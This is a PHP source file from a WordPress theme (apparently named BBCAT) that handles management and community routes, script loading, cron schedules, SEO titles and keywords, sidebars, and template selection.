        $new_rules['management/orders/([a-zA-Z]+)/page/([0-9]{1,})$'] = 'index.php?manage_child_route=orders&manage_grandchild_route=$matches[1]&is_manage_route=1&paged=$matches[2]';
        $new_rules['management/users/([a-zA-Z]+)/page/([0-9]{1,})$'] = 'index.php?manage_child_route=users&manage_grandchild_route=$matches[1]&is_manage_route=1&paged=$matches[2]';
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }

    return $wp_rewrite;
}
add_filter('generate_rewrite_rules', 'tt_handle_management_child_routes_rewrite');

function tt_handle_manage_child_routes_template()
{
    $is_manage_route = strtolower(get_query_var('is_manage_route'));
    $manage_child_route = strtolower(get_query_var('manage_child_route'));
    $manage_grandchild_route = strtolower(get_query_var('manage_grandchild_route'));
    if ($is_manage_route && $manage_child_route) {
        //非Home
        global $wp_query;
        $wp_query->is_home = false;

        if ($wp_query->is_404()) {
            return;
        }

        //未登录的跳转到登录页
        if(!is_user_logged_in()) {
            wp_redirect(tt_add_redirect(tt_url_for('signin'), tt_get_current_url()), 302);
            exit;
        }

        //非管理员403处理
        if(!current_user_can('edit_users')) {
            wp_die(__('你没有权限访问该页面', 'tt'), __('错误: 没有权限', 'tt'), 403);
        }

        $allow_routes = (array) json_decode(ALLOWED_MANAGE_ROUTES);
        $allow_child = array_keys($allow_routes);
        // 非法的子路由处理
        if (!in_array($manage_child_route, $allow_child)) {
            Utils::set404();

            return;
        }

        if ($manage_child_route === 'orders' && $manage_grandchild_route) {
            if (preg_match('/([0-9]{1,})/', $manage_grandchild_route)) { // 对于orders/8单个订单详情路由，孙路由必须是数字
                $template = THEME_TPL.'/management/tpl.Manage.Order.php';
                load_template($template);
                exit;
            } elseif (in_array($manage_grandchild_route, $allow_routes['orders'])) { // 对于orders/all 指定类型订单列表路由，孙路由是all/cash/credit之中
                $template = THEME_TPL.'/management/tpl.Manage.Orders.php';
                load_template($template);
                exit;
            }
            Utils::set404();

            return;
        }
        if ($manage_child_route === 'users' && $manage_grandchild_route) {
            if (preg_match('/([0-9]{1,})/', $manage_grandchild_route)) { // 对于users/57单个订单详情路由，孙路由必须是数字
                $template = THEME_TPL.'/management/tpl.Manage.User.php';
                load_template($template);
                exit;
            } elseif (in_array($manage_grandchild_route, $allow_routes['users'])) { // 对于users/all 指定类型订单列表路由，孙路由是all/administrator/editor/author/contributor/subscriber之中
                $template = THEME_TPL.'/management/tpl.Manage.Users.php';
                load_template($template);
                exit;
            }
            Utils::set404();

            return;
        }
        if ($manage_child_route !== 'orders' && $manage_child_route !== 'users') {
            // 除orders/users外不允许有孙路由
            if ($manage_grandchild_route) {
                Utils::set404();

                return;
            }
        }
        $template_id = ucfirst($manage_child_route);
        $template = THEME_TPL.'/management/tpl.Manage.'.$template_id.'.php';
        load_template($template);
        exit;
    }
}
add_action('template_redirect', 'tt_handle_manage_child_routes_template', 5);

function tt_add_manage_page_query_vars($public_query_vars)
{
    if (!is_admin()) {
        $public_query_vars[] = 'is_manage_route';
        $public_query_vars[] = 'manage_child_route';
        $public_query_vars[] = 'manage_grandchild_route';
    }

    return $public_query_vars;
}
add_filter('query_vars', 'tt_add_manage_page_query_vars');

function tt_refresh_rewrite()
{
    // 如果启用了memcache等对象缓存，固定链接的重写规则缓存对应清除
    wp_cache_flush();

    // 刷新固定链接
    global $wp_rewrite;
    $wp_rewrite->flush_rules();
}

function tt_handle_thread_routes_rewrite($wp_rewrite)
{
    if (get_option('permalink_structure')) {

        $new_rules['thread/create([^/]*)$'] = 'index.php?thread_route=create&is_thread_route=1';
        $new_rules['thread/edit/([0-9]+)([^/]*)$'] = 'index.php?thread_route=create&is_thread_route=1&pid=$matches[1]';

        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }

    return $wp_rewrite;
}
add_filter('generate_rewrite_rules', 'tt_handle_thread_routes_rewrite');

function tt_handle_thread_routes_template()
{
    $is_thread_route = strtolower(get_query_var('is_thread_route'));
    $thread_route = strtolower(get_query_var('thread_route'));
    if ($is_thread_route && $thread_route) {
        //非Home
        global $wp_query;
        $wp_query->is_home = false;

        if ($wp_query->is_404()) {
            return;
        }

//        $template_id = ucfirst($thread_route);
        $template = THEME_TPL.'/thread/tpl.Thread.Main.php';
        load_template($template);
        exit;
    }
}
add_action('template_redirect', 'tt_handle_thread_routes_template', 5);

function tt_add_thread_page_query_vars($public_query_vars)
{
    if (!is_admin()) {
        $public_query_vars[] = 'is_thread_route';
        $public_query_vars[] = 'thread_route';
    }

    return $public_query_vars;
}
add_filter('query_vars', 'tt_add_thread_page_query_vars');

function tt_robots_modification($output, $public)
{
    $output .= "\nDisallow: /oauth";
    $output .= "\nDisallow: /m";
    $output .= "\nDisallow: /me";

    return $output;
}
add_filter('robots_txt', 'tt_robots_modification', 10, 2);

function tt_add_noindex_meta()
{
    if (get_query_var('is_uc') || get_query_var('action') || get_query_var('site_util') || get_query_var('is_me_route') || get_query_var('is_thread_route') || get_post_type() == 'thread') {
        wp_no_robots();
    }
}
add_action('wp_head', 'tt_add_noindex_meta');

function tt_cron_add_weekly($schedules)
{
    $schedules['weekly'] = array(
        'interval' => 604800, // 1周 = 60秒 * 60分钟 * 24小时 * 7天
        'display' => __('Weekly', 'tt'),
    );

    return $schedules;
}
add_filter('cron_schedules', 'tt_cron_add_weekly');

function tt_setup_common_hourly_schedule()
{
    if (!wp_next_scheduled('tt_setup_common_hourly_event')) {
        // 1471708800是北京2016年8月21日00:00:00时间戳
        wp_schedule_event(1471708800, 'hourly', 'tt_setup_common_hourly_event');
    }
}
add_action('wp', 'tt_setup_common_hourly_schedule');

function tt_setup_common_daily_schedule()
{
    if (!wp_next_scheduled('tt_setup_common_daily_event')) {
        // 1471708800是北京2016年8月21日00:00:00时间戳
        wp_schedule_event(1471708800, 'daily', 'tt_setup_common_daily_event');
    }
}
add_action('wp', 'tt_setup_common_daily_schedule');

function tt_setup_common_twicedaily_schedule()
{
    if (!wp_next_scheduled('tt_setup_common_twicedaily_event')) {
        // 1471708800是北京2016年8月21日00:00:00时间戳
        wp_schedule_event(1471708800, 'twicedaily', 'tt_setup_common_twicedaily_event');
    }
}
add_action('wp', 'tt_setup_common_twicedaily_schedule');

function tt_setup_common_weekly_schedule()
{
    if (!wp_next_scheduled('tt_setup_common_weekly_event')) {
        // 1471795200是北京2016年8月22日 星期一 00:00:00时间戳
        wp_schedule_event(1471795200, 'twicedaily', 'tt_setup_common_weekly_event');
    }
}
add_action('wp', 'tt_setup_common_weekly_schedule');


defined('VUETT') || define('VUETT', json_encode(array(
    'uid' => get_current_user_id(),
    'publicPath' => THEME_CDN_ASSET,
    'home' => esc_url_raw(home_url()),
    'themeRoot' => THEME_URI,
    'commonServiceApi' => home_url('/api/v1/commonservice'),
    '_wpnonce' => wp_create_nonce('wp_rest')
)));

function tt_register_scripts()
{
    $jquery_url = json_decode(JQUERY_SOURCES)->{tt_get_option('tt_jquery', 'local_1')};
    if ( !is_admin() ) {
    wp_deregister_script( 'jquery' );
    wp_register_script('jquery', $jquery_url, array(), null, tt_get_option('tt_foot_jquery', false));
    //wp_localize_script( 'tt_common', 'TT', $data );
    wp_enqueue_script('jquery');
    }else{
    wp_register_script('tt_jquery', $jquery_url, array(), null, tt_get_option('tt_foot_jquery', false));
    //wp_localize_script( 'tt_common', 'TT', $data );
    wp_enqueue_script('tt_jquery');
    }
    //wp_register_script( 'tt_common', THEME_CDN_ASSET . '/js/' . JS_COMMON, array(), null, true );
    wp_register_script('tt_home', THEME_CDN_ASSET.'/js/'.JS_HOME, array(), null, true);
    wp_register_script('tt_front_page', THEME_CDN_ASSET.'/js/'.JS_FRONT_PAGE, array(), null, true);
    wp_register_script('tt_single_post', THEME_CDN_ASSET.'/js/'.JS_SINGLE, array(), null, true);
    wp_register_script('tt_single_page', THEME_CDN_ASSET.'/js/'.JS_PAGE, array(), null, true);
    wp_register_script('tt_archive_page', THEME_CDN_ASSET.'/js/'.JS_ARCHIVE, array(), null, true);
    wp_register_script('tt_product_page', THEME_CDN_ASSET.'/js/'.JS_PRODUCT, array(), null, true);
    wp_register_script('tt_products_page', THEME_CDN_ASSET.'/js/'.JS_PRODUCT_ARCHIVE, array(), null, true);
    wp_register_script('tt_uc_page', THEME_CDN_ASSET.'/js/'.JS_UC, array(), null, true);
    wp_register_script('tt_me_page', THEME_CDN_ASSET.'/js/'.JS_ME, array(), null, true);
    wp_register_script('tt_action_page', THEME_CDN_ASSET.'/js/'.JS_ACTION, array(), null, true);
    wp_register_script('tt_404_page', THEME_CDN_ASSET.'/js/'.JS_404, array(), null, true);
    wp_register_script('tt_site_utils', THEME_CDN_ASSET.'/js/'.JS_SITE_UTILS, array(), null, true);
    wp_register_script('tt_oauth_page', THEME_CDN_ASSET.'/js/'.JS_OAUTH, array(), null, true);
    wp_register_script('tt_manage_page', THEME_CDN_ASSET.'/js/'.JS_MANAGE, array(), null, true);
    wp_register_script('tt_thread_page', THEME_CDN_ASSET.'/js/'.JS_THREAD, array(), null, true);

    global $tt_auth_config;
    $data = array(
        'debug' => tt_get_option('tt_theme_debug', false),
        'uid' => get_current_user_id(),
        'language' => get_option('WPLANG', 'zh_CN'),
        'apiRoot' => esc_url_raw(get_rest_url()),
        '_wpnonce' => wp_create_nonce('wp_rest'), // REST_API服务验证该nonce, 如果不提供将清除登录用户信息  @see rest-api.php `rest_cookie_check_errors`
        'home' => esc_url_raw(home_url()),
        'themeRoot' => THEME_URI,
        'isHome' => is_home(),
        'commentsPerPage' => tt_get_option('tt_comments_per_page', 20),
        'sessionApiTail' => tt_get_option('tt_session_api', 'session'),
        'contributePostWordsMin' => absint(tt_get_option('tt_contribute_post_words_min', 100)),
        'o' => $tt_auth_config['order'],
        'e' => get_bloginfo('admin_email'),
        'v' => trim(wp_get_theme()->get('Version')),
        'yzApi' => tt_get_option('tt_youzan_util_api', ''),
        'siteName' => get_bloginfo('name'),
        'weiboKey' => tt_get_option('tt_weibo_openkey'),
        'publicPath' => THEME_CDN_ASSET,
    );
    if (is_single()) {
        $data['isSingle'] = true;
        $data['pid'] = get_queried_object_id();
    }
    
    //wp_enqueue_script( 'tt_common' );
    $script = '';
    $post_type = get_post_type();

    if (is_home()) {
        $script = 'tt_home';
    } elseif($post_type === 'thread' || get_query_var('is_thread_route')) {
        $script = array('tt_thread_vendor', 'tt_thread_app');
    } elseif (is_single()) {
        $script = $post_type === 'product' ? 'tt_product_page' : ($post_type === 'bulletin' ? 'tt_single_page' : 'tt_single_post');
    } elseif ((is_archive() && !is_author()) || (is_search() && isset($_GET['in_shop']) && $_GET['in_shop'] == 1)) {
        $script = $post_type === 'product' || (is_search() && isset($_GET['in_shop']) && $_GET['in_shop'] == 1) ? 'tt_products_page' : 'tt_archive_page';
    } elseif (is_author()) {
        $script = 'tt_uc_page';
    } elseif (is_404()) {
        $script = 'tt_404_page';
    } elseif (get_query_var('is_me_route')) {
        $script = 'tt_me_page';
    } elseif (get_query_var('action')) {
        $script = 'tt_action_page';
    } elseif (is_front_page()) {
        $script = 'tt_front_page';
    } elseif (get_query_var('site_util')) {
        $script = 'tt_site_utils';
    } elseif (get_query_var('oauth')) {
        $script = 'tt_oauth_page';
    } elseif (get_query_var('is_manage_route')) {
        $script = 'tt_manage_page';
    } else {
        // is_page() ?
        $script = 'tt_single_page';
    }

    if ($script) {
        if (!is_array($script)) {
            $script = array($script);
        }
        foreach ($script as $key => $item) {
            if ($key == 0) {
                wp_localize_script($item, 'TT', $data);
            }
            wp_enqueue_script($item);
        }
    }
}
add_action('wp_enqueue_scripts', 'tt_register_scripts');

function tt_get_page_title()
{
    $title = '';
    if ($action = get_query_var('action')) {
        switch ($action) {
            case 'signin':
                $title = __('Sign In', 'tt');
                break;
            case 'signup':
                $title = __('Sign Up', 'tt');
                break;
            case 'activate':
                $title = __('Activate Registration', 'tt');
                break;
            case 'signout':
                $title = __('Sign Out', 'tt');
                break;
            case 'findpass':
                $title = __('Find Password', 'tt');
                break;
            case 'resetpass':
                $title = __('Reset Password', 'tt');
                break;
        }

        return $title.' - '.get_bloginfo('name');
    }
    if ($me_route = get_query_var('me_child_route')) {
        switch ($me_route) {
            case 'settings':
                $title = __('My Settings', 'tt');
                break;
            case 'notifications':
                $title = __('My Notifications', 'tt');
                break;
            case 'messages': //TODO grandchild route in/out msgbox
                $title = __('My Messages', 'tt');
                break;
            case 'stars':
                $title = __('My Stars', 'tt');
                break;
            case 'credits':
                $title = __('My Credits', 'tt');
                break;
            case 'cash':
                $title = __('My Cash', 'tt');
                break;
            case 'orders':
                $title = __('My Orders', 'tt');
                break;
            case 'order':
                $title = __('My Order', 'tt');
                break;
            case 'drafts':
                $title = __('My Drafts', 'tt');
                break;
            case 'newpost':
                $title = __('New Post', 'tt');
                break;
            case 'editpost':
                $title = __('Edit Post', 'tt');
                break;
            case 'membership':
                $title = __('My Membership', 'tt');
                break;
        }

        return $title.' - '.get_bloginfo('name');
    }
    if ($site_util = get_query_var('site_util')) {
        switch ($site_util) {
            case 'checkout':
                $title = __('Check Out Orders', 'tt');
                break;
            case 'payresult':
                $title = __('Payment Result', 'tt');
                break;
            case 'qrpay':
            case 'kpay':
            case 'youzanpay':
            case 'aliqrpay':
                $title = __('Do Payment', 'tt');
                break;
            case 'download':
                global $origin_post;
                $title = __('Resources Download:', 'tt').$origin_post->post_title;
                break;
            case 'privacy-policies-and-terms':
                $title = __('Privacy Policies and Terms', 'tt');
                break;
            case 'alipayreturn':
                $title = __('Payment Result', 'tt');
                break;
            // TODO more
        }

        return $title.' - '.get_bloginfo('name');
    }
    if ($oauth = get_query_var('oauth') && get_query_var('oauth_last')) {
        switch ($oauth) {
            case 'qq':
                $title = __('Complete Account Info - QQ Connect', 'tt');
                break;
            case 'weibo':
                $title = __('Complete Account Info - Weibo Connect', 'tt');
                break;
            case 'weixin':
                $title = __('Complete Account Info - Weixin Connect', 'tt');
                break;
        }

        return $title.' - '.get_bloginfo('name');
    }
    if ($site_manage = get_query_var('manage_child_route')) {
        switch ($site_manage) {
            case 'status':
                $title = __('Site Statistic', 'tt');
                break;
            case 'posts':
                $title = __('Posts Management', 'tt');
                break;
            case 'comments':
                $title = __('Comments Management', 'tt');
                break;
            case 'users':
                $title = __('Users Management', 'tt');
                break;
            case 'orders':
                $title = __('Orders Management', 'tt');
                break;
            case 'coupons':
                $title = __('Coupons Management', 'tt');
                break;
            case 'invites':
                $title = __('邀请码管理', 'tt');
                break;
            case 'cards':
                $title = __('Cards Management', 'tt');
                break;
            case 'members':
                $title = __('Members Management', 'tt');
                break;
            case 'products':
                $title = __('Products Management', 'tt');
                break;
        }

        return $title.' - '.get_bloginfo('name');
    }
    if (is_home() || is_front_page()) {
        $title = get_bloginfo('name').' - '.get_bloginfo('description');
    } elseif (is_single() && get_post_type() != 'product') {
        global $post;
        $tkd = get_post_meta($post->ID, 'tt_post_seo', true);
        $tkd = $tkd ? maybe_unserialize($tkd) : array('tt_post_title' => '', 'tt_post_keywords' => '', 'tt_post_description' => '');
        $title = trim(wp_title('', false)) .' - '.get_bloginfo('name');
        $title = $tkd['tt_post_title'] ? $tkd['tt_post_title'] : $title;
        if ($page = get_query_var('page') && get_query_var('page') > 1) {
            $title .= sprintf(__(' - Page %d', 'tt'), get_query_var('page'));
        }
        if (get_query_var('is_thread_route') || get_post_type() == 'thread') {
            $title .= ' ' . __('Community', 'tt');
        }
    } elseif (is_page()) {
        $title = trim(wp_title('', false)).' - '.get_bloginfo('name');
    } elseif (is_category()) {
        $cat_ID = get_query_var('cat');
        $category = get_queried_object();
        $des = $category->description ? $category->description.' - ' : '';
        $title = $category->cat_name.' - '.$des.get_bloginfo('name');
        $term_meta = get_option( "bbcat_taxonomy_$cat_ID" );
        $title = $term_meta['tax_title'] ? $term_meta['tax_title'] : $title;
    } elseif (is_author()) {
        // TODO more tab titles
        $author = get_queried_object();
        $name = tt_get_privacy_mail($author->data->display_name);
        $title = sprintf(__('%s\'s Home Page', 'tt'), $name).' - '.get_bloginfo('name');
    } elseif (get_post_type() == 'product') {
        if (is_archive()) {
            if (tt_is_product_category()) {
                $title = get_queried_object()->name.' - '.__('Product Category', 'tt');
            } elseif (tt_is_product_tag()) {
                $title = get_queried_object()->name.' - '.__('Product Tag', 'tt');
            } else {
                $title = __('Market', 'tt').' - '.get_bloginfo('name');
            }
        } else {
            $title = trim(wp_title('', false)).' - '.__('Market', 'tt');
        }
    } elseif (is_search()) {
        $title = __('Search', 'tt').get_search_query().' - '.get_bloginfo('name');
    } elseif (is_year()) {
        $title = get_the_time(__('Y', 'tt')).__('posts archive', 'tt').' - '.get_bloginfo('name');
    } elseif (is_month()) {
        $title = get_the_time(__('Y.n', 'tt')).__('posts archive', 'tt').' - '.get_bloginfo('name');
    } elseif (is_day()) {
        $title = get_the_time(__('Y.n.j', 'tt')).__('posts archive', 'tt').' - '.get_bloginfo('name');
    } elseif (is_tag()) {
        $title = __('Tag: ', 'tt').get_queried_object()->name.' - '.get_bloginfo('name');
    } elseif (is_404()) {
        $title = __('Page Not Found', 'tt').' - '.get_bloginfo('name');
    }

    if (empty($title) && (get_query_var('is_thread_route') || get_post_type() == 'thread')) {
        $title = get_bloginfo('name') . ' ' . __('Community', 'tt');
    }

    // paged
    if ($paged = get_query_var('paged') && get_query_var('paged') > 1) {
        $title .= sprintf(__(' - Page %d ','tt'), get_query_var('paged'));
    }

    return $title;
}

function tt_get_keywords_and_description() {
    $keywords = '';
    $description = '';
    if($action = get_query_var('action')) {
        switch ($action) {
            case 'signin':
                $keywords = __('Sign In', 'tt');
                break;
            case 'signup':
                $keywords = __('Sign Up', 'tt');
                break;
            case 'activate':
                $keywords = __('Activate Registration', 'tt');
                break;
            case 'signout':
                $keywords = __('Sign Out', 'tt');
                break;
            case 'findpass':
                $keywords = __('Find Password', 'tt');
                break;
        }
        $description = __('由BBCAT主题驱动', 'tt');
        return array(
            'keywords' => $keywords,
            'description' => $description
        );
    }
    if(is_home() || is_front_page()) {
        $keywords = tt_get_option('tt_home_keywords');
        $description = tt_get_option('tt_home_description');
    }elseif(is_single() && get_post_type() != 'product') {
        $tags = get_the_tags();
        $tag_names = array();
        if($tags){
            foreach ($tags as $tag){
                $tag_names[] = $tag->name;
            }
            $keywords = implode(',', $tag_names);
        }
        global $post;
        $tkd = get_post_meta($post->ID, 'tt_post_seo', true);
        $tkd = $tkd ? maybe_unserialize($tkd) : array('tt_post_title' => '', 'tt_post_keywords' => '', 'tt_post_description' => '');
        setup_postdata($post);
        $description = mb_substr(strip_tags(get_the_excerpt($post)), 0, 100);
        $keywords = $tkd['tt_post_keywords'] ? $tkd['tt_post_keywords'] : $keywords;
        $description = $tkd['tt_post_description'] ? $tkd['tt_post_description'] : $description;
    }elseif(is_page()){
        global $post;
        if($post->ID){
            $keywords = get_post_meta($post->ID, 'tt_keywords', true);
            $description = get_post_meta($post->ID, 'tt_description', true);
        }
    }elseif(is_category()) {
        $category = get_queried_object();
        $keywords = $category->name;
        $description = strip_tags($category->description);
        $cat_ID = get_query_var('cat');
        $term_meta = get_option( "bbcat_taxonomy_$cat_ID" );
        $keywords = $term_meta['tax_keywords'] ? $term_meta['tax_keywords'] : $keywords;
        $description = $term_meta['tax_description'] ? $term_meta['tax_description'] : $description;
    }elseif(is_author()){
        // TODO more tab titles
        $author = get_queried_object();
        $name = tt_get_privacy_mail($author->data->display_name);
        $keywords = $name . ',' . __('Ucenter', 'tt'). ','. __('BBCAT主题用户中心和商店系统', 'tt');
        $description = sprintf(__('%s\'s Home Page', 'tt'), $name) . __(',由BBCAT主题驱动', 'tt');
    }elseif(get_post_type() == 'product'){
        if(is_archive()){
            if(tt_is_product_category()) {
                $category = get_queried_object();
                $keywords = $category->name;
                $description = strip_tags($category->description);
            }elseif(tt_is_product_tag()){
                $tag = get_queried_object();
                $keywords = $tag->name;
                $description = strip_tags($tag->description);
            }else{
                $keywords = tt_get_option('tt_shop_keywords', __('Market', 'tt')) . ',' . __('BBCAT主题用户中心和商店系统', 'tt');
                $banner_title = tt_get_option('tt_shop_title', 'Shop Quality Products');
                $banner_subtitle = tt_get_option('tt_shop_sub_title', 'Themes - Plugins - Services');
                $description = $banner_title . ', ' . $banner_subtitle . ', ' . __('由BBCAT主题驱动(BBCat, 一个功能强大的内嵌用户中心和商店系统的WordPress主题)', 'tt');
            }
        }else{
            global $post;
            $tags = array();
            if($post->ID){
                $tags = wp_get_post_terms($post->ID, 'product_tag');
            }
            $tag_names = array();
            foreach ($tags as $tag){
                $tag_names[] = $tag->name;
            }
            $keywords = implode(',', $tag_names);
            $description = strip_tags(get_the_excerpt());
        }
    }elseif(is_search()){
        //TODO
    }elseif(is_year()){
        //TODO
    }elseif(is_month()){
        //TODO
    }elseif(is_day()){
        //TODO
    }elseif(is_tag()){
        $tag = get_queried_object();
        $keywords = $tag->name;
        $description = strip_tags($tag->description);
    }elseif(is_404()){
        //TODO
    }

    return array(
        'keywords' => $keywords,
        'description' => $description
    );
}

function tt_dynamic_sidebar()
{
    // 默认通用边栏
    $sidebar = 'sidebar_common';

    // 根据页面选择边栏
    if (is_home() && $option = tt_get_option('tt_home_sidebar')) {
        $sidebar = $option;
    }
    if (is_single() && $option = tt_get_option('tt_single_sidebar')) {
        $sidebar = $option;
    }
    if (is_archive() && $option = tt_get_option('tt_archive_sidebar')) {
        $sidebar = $option;
    }
    if (is_category() && $option = tt_get_option('tt_category_sidebar')) {
        $sidebar = $option;
    }
    if (is_search() && $option = tt_get_option('tt_search_sidebar')) {
        $sidebar = $option;
    }
    if (is_404() && $option = tt_get_option('tt_404_sidebar')) {
        $sidebar = $option;
    }
    if (is_page() && $option = tt_get_option('tt_page_sidebar')) {
        $sidebar = $option;
    }
    if (get_query_var('site_util') == 'download' && $option = tt_get_option('tt_download_sidebar')) {
        $sidebar = $option;
    }

    // 检查一个页面或文章是否有特指边栏
    if (is_singular()) {
        wp_reset_postdata();
        global $post;
        $meta = get_post_meta($post->ID, 'tt_sidebar', true);  //TODO: add post meta box for `tt_sidebar`
        if ($meta) {
            $sidebar = $meta;
        }
    }

    return $sidebar;
}

function tt_register_sidebars()
{
    $sidebars = (array) tt_get_option('tt_register_sidebars', array('sidebar_common' => true));
    $titles = array(
        'sidebar_common' => __('Common Sidebar', 'tt'),
        'sidebar_home' => __('Home Sidebar', 'tt'),
        'sidebar_single' => __('Single Sidebar', 'tt'),
        //'sidebar_archive'   =>    __('Archive Sidebar', 'tt'),
        //'sidebar_category'  =>    __('Category Sidebar', 'tt'),
        'sidebar_search' => __('Search Sidebar', 'tt'),
        //'sidebar_404'       =>    __('404 Sidebar', 'tt'),
        'sidebar_page' => __('Page Sidebar', 'tt'),
        'sidebar_download' => __('Download Page Sidebar', 'tt'),
    );
    foreach ($sidebars as $key => $value) {
        if (!$value) {
            continue;
        }
        $title = array_key_exists($key, $titles) ? $titles[$key] : $value;
        register_sidebar(
            array(
                'name' => $title,
                'id' => $key,
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="widget-title"><span>',
                'after_title' => '</span></h3>',
            )
        );
    }
}
add_action('widgets_init', 'tt_register_sidebars');

function tt_get_index_template($template)
{
    //TODO: if(tt_get_option('layout')=='xxx') -> index-xxx.php
    unset($template);

    return THEME_TPL.'/tpl.Index.php';
}
add_filter('index_template', 'tt_get_index_template', 10, 1);

function tt_get_home_template($template)
{
    unset($template);

    return THEME_TPL.'/tpl.Home.php';
}
add_filter('home_template', 'tt_get_home_template', 10, 1);

function tt_get_front_page_template($template)
{
    unset($template);

    return locate_template(array('core/templates/tpl.FrontPage.php', 'core/templates/tpl.Home.php', 'core/templates/tpl.Index.php'));
}
add_filter('front_page_template', 'tt_get_front_page_template', 10, 1);

function tt_get_404_template($template)
{
    unset($template);

    return THEME_TPL.'/tpl.404.php';
}
add_filter('404_template', 'tt_get_404_template', 10, 1);

function tt_get_archive_template($template)
{
    unset($template);

    return THEME_TPL.'/tax/tpl.Archive.php';
}
add_filter('archive_template', 'tt_get_archive_template', 10, 1);

function tt_get_author_template($template)
{
    unset($template);

    // 为不同角色用户定义不同模板
    // https://developer.wordpress.org/themes/basics/template-hierarchy/#example
    $author = get_queried_object();
    $role = count($author->roles) ? $author->roles[0] : 'subscriber';

    // 判断是否用户中心页(因为用户中心页和默认的作者页采用了相同的wp_query_object)
    if (get_query_var('uc') && intval(get_query_var('uc')) === 1) {
        $template = apply_filters('user_template', $author);
        if ($template === 'header-404') {
            return '';
        }
        if ($template) {
            return $template;
        }
    }

    $template = 'core/templates/tpl.Author.php'; // TODO: 是否废弃 tpl.Author类似模板，Author已合并至UC
    return locate_template(array('core/templates/tpl.Author.'.ucfirst($role).'.php', $template));
}
add_filter('author_template', 'tt_get_author_template', 10, 1);

function tt_get_user_template($user)
{
    $templates = array();

    if ($user instanceof WP_User) {
        if ($uc_tab = get_query_var('uctab')) {
            // 由于profile tab是默认tab，直接使用/@nickname主路由，对于/@nickname/profile的链接会重定向处理，因此不放至允许的tabs中
            $allow_tabs = (array) json_decode(ALLOWED_UC_TABS);
            if (!in_array($uc_tab, $allow_tabs)) {
                return 'header-404';
            }
            $templates[] = 'core/templates/uc/tpl.UC.'.ucfirst(strtolower($uc_tab)).'.php';
        } else {
            //$role = $user->roles[0];
            $templates[] = 'core/templates/uc/tpl.UC.Profile.php';
            // Maybe dropped
            // TODO: maybe add membership templates
        }
    }
    $templates[] = 'core/templates/uc/tpl.UC.php';

    return locate_template($templates);
}
add_filter('user_template', 'tt_get_user_template', 10, 1);

function tt_get_category_template($template)
{
    unset($template);
    // TODO: add category slug support
    return locate_template(array('core/templates/tax/tpl.Category.php', 'core/templates/tax/tpl.Archive.php'));
}
add_filter('category_template', 'tt_get_category_template', 10, 1);

function tt_get_tag_template($template)
{
    unset($template);

    return locate_template(array('core/templates/tax/tpl.Tag.php', 'core/templates/tax/tpl.Archive.php'));
}
add_filter('tag_template', 'tt_get_tag_template', 10, 1);

function tt_get_taxonomy_template($template)
{
    unset($template);

    return locate_template(array('core/templates/tax/tpl.Taxonomy.php', 'core/templates/tax/tpl.Archive.php'));
}
add_filter('taxonomy_template', 'tt_get_taxonomy_template', 10, 1);

function tt_get_date_template($template)
{
    unset($template);

    return locate_template(array('core/templates/tax/tpl.Date.php', 'core/templates/tax/tpl.Archive.php'));
}
add_filter('date_template', 'tt_get_date_template', 10, 1);

function tt_get_page_template($template)
{
    if (!empty($template)) {
        return $template;
    }
    unset($template);

    return locate_template(array('core/templates/page/tpl.Page.php'));
}
add_filter('page_template', 'tt_get_page_template', 10, 1);

function tt_get_search_template($template)
{
    unset($template);
    if (isset($_GET['in_shop']) && $_GET['in_shop'] == 1) {
        return locate_template(array('core/templates/shop/tpl.Product.Search.php'));
    }

    return locate_template(array('core/templates/tpl.Search.php'));
}
add_filter('search_template', 'tt_get_search_template', 10, 1);

function tt_get_single_template($template)
{
    unset($template);
    $single = get_queried_object();

    return locate_template(array('core/templates/single/tpl.Single.'.$single->slug.'.php', 'core/templates/single/tpl.Single.'.$single->ID.'.php', 'core/templates/single/tpl.Single.php'));
}
add_filter('single_template', 'tt_get_single_template', 10, 1);

function tt_get_attachment_template($template)
{
    unset($template);

    return locate_template(array('core/templates/attachments/tpl.Attachment.php'));
}
add_filter('attachment_template', 'tt_get_attachment_template', 10, 1);

function tt_get_text_template($template)
{
    //TODO: other MIME types, e.g `video`
    unset($template);

    return locate_template(array('core/templates/attachments/tpl.MIMEText.php', 'core/templates/attachments/tpl.Attachment.php'));
}
add_filter('text_template', 'tt_get_text_template', 10, 1);
add_filter('plain_template', 'tt_get_text_template', 10, 1);
add_filter('text_plain_template', 'tt_get_text_template', 10, 1);

function tt_get_comments_popup_template($template)
{
    unset($template);

    return THEME_TPL.'/tpl.CommentPopup.php';
}
add_filter('comments_popup', 'tt_get_comments_popup_template', 10, 1);

function tt_get_embed_template($template)
{
    unset($template);

    return THEME_TPL.'/tpl.Embed.php';
}
add_filter('embed_template', 'tt_get_embed_template', 10, 1);

function tt_get_cms_cat_template ($cat_id) {
    $default = 'Style_0';
    $key = sprintf('tt_cms_home_cat_style_%d', $cat_id);
    $option = tt_get_option($key, $default);
    if (in_array($option, array('Style_0', 'Style_1', 'Style_2', 'Style_3', 'Style_4', 'Style_5', 'Style_6', 'Style_7'))) {
        return $option;
    }
    return $default;
}

function tt_get_thumb($post = null, $size = 'thumbnail')
{
    if (is_numeric($post) && $post <= 0) {
        $specifiedImage = '';
        if ($post == -4) {
            // 充值积分
            $specifiedImage = THEME_URI.'/assets/img/credit-thumb.png';
        } elseif ($post == -1 || $post == -2) {
            // 月度/季度会员
            $specifiedImage = THEME_URI.'/assets/img/membership-thumb.png';
        } elseif ($post == -3) {
            // 年付会员
            $specifiedImage = THEME_URI.'/assets/img/annual-membership-thumb.png';
        } elseif ($post == -9) {
            // 邀请码
            $specifiedImage = THEME_URI.'/assets/img/invite-thumb.png';
        } elseif ($post == -8) {
            // 捐赠
            $specifiedImage = THEME_URI.'/assets/img/donate-thumb.png';
        }
        return PostImage::getOptimizedImageUrl($specifiedImage, $size);
    }

    if (!$post) {
        global $post;
    }
    $post = get_post($post);

    // 优先利用缓存
    $callback = function () use ($post, $size) {
        $instance = new PostImage($post, $size);
        if(tt_get_option('tt_enable_thumb_weibo_image', false)){
        $vm = WeiboImageVM::getInstance($instance->getThumb()); 
        $data = $vm->modelData;
        return $data->url;
        }else{
          return $instance->getThumb();
        }
    };
    $instance = new PostImage($post, $size);

    return tt_cached($instance->cache_key, $callback, 'thumb', 60 * 60 * 24 * 7);
}

function tt_get_user_cap_string($user_id)
{
    if (user_can($user_id, 'install_plugins')) {
        return __('Site Manager', 'tt');
    }
